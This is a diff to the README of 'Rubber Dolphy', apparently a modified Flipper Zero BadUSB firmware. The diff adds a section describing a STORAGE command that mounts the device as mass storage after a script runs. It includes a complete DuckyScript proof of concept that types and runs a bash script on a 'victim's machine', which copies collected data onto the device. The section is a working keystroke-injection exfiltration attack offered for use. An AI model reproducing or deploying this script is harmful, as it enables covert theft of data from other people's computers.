@@ -39,9 +39,65 @@ On the *flipperzero-firmware* folder:
 
 ### Ducky Scripts
 
-Under *ducky_scripts_examples/* folder in this repo you'll find examples for Linux and Windows.
+Under [ducky_scripts_examples folder](https://github.com/carvilsi/rubber-dolphy/tree/main/ducky_scripts_examples) in this repo you'll find examples for Linux and Windows. And another simple DuckyScript called *mount_mass_storage_img* to access the mass storage on your laptop and get the copied data.
 
 For now **Rubber Dolphy** still using the oficial *BadUSB* FlipperZero app assests folder, to deal with *layouts* and to select the *duckyscript* to run, therefore you must upload your duckyscripts to *SD Card/badusb/* folder.
+
+#### How it works
+
+For now the exfiltration from the victim's machine requires manual action to perform the copy of the collected data. This is one of the points that I would like improve, trying to skip clicking when the DuckyScript finish.
+
+A new Command called **STORAGE** has been added to the Command Set of [BadUSB File Format](https://developer.flipper.net/flipperzero/doxygen/badusb_file_format.html) in order to allow mass storage mode on FlipperZero once the DuckyScript has been finished. Then on the BadUSB GUI a button called *Exflt* appears. 
+
+<div align="center">
+  <p>
+    <img src="https://github.com/carvilsi/rubber-dolphy/blob/main/.github/images/badusb_exflt.png" alt="badusb_exfiltration" >
+  </p>
+</div>
+
+When clicking down, FlipperZero will exits BasdUSB mode and mounts a mass storage, the expected name of the unit on the threated machine is *MASSSTORAGE*.
+
+<div align="center">
+  <p>
+    <img src="https://github.com/carvilsi/rubber-dolphy/blob/main/.github/images/badusb_massstorage.png" alt="badusb_masstorage" >
+  </p>
+</div>
+
+
+The DuckyScript copies and runs a script that waits until this unit is available on the victims machine, and then copies the data to exfiltrate.
+
+Here a DuckyScript example of the above described mechanism (bash).
+
+```bash
+REM =================== Exfiltration PoC ===================
+
+REM Command to tell Flipper that will be exfiltration
+REM Could be place at the begining of the file (after the ID if is there)
+STORAGE
+
+REM Create a bash script to do the exfiltration
+STRINGLN cat > exfiltration.sh << EOF
+
+STRINGLN #!/bin/bash
+STRINGLN # Create a function to get the Mass Storage path
+STRINGLN gms(){ ms=\$(df|awk '/MASSSTORAGE/{print \$6}');}
+
+STRINGLN # Repeat until get the Mass Storage path 
+STRINGLN until [ \`echo \$ms 2>/dev/null\` ];do gms;done;
+
+REM Copy the generated file on the Mass Storage
+STRINGLN cp my_data.txt \$ms
+
+STRINGLN # Done :)
+STRINGLN echo done :\)
+
+STRINGLN EOF
+
+REM Execute the script
+STRINGLN sh exfiltration.sh
+
+REM =======================================================
+```
 
 ---
 
@@ -52,3 +108,4 @@ For now **Rubber Dolphy** still using the oficial *BadUSB* FlipperZero app asses
 Feedback from usage and contributions are very welcome.
 Also if you like it, please leave a :star: I would appreciate it ;)
 
+Hack The Planet! 
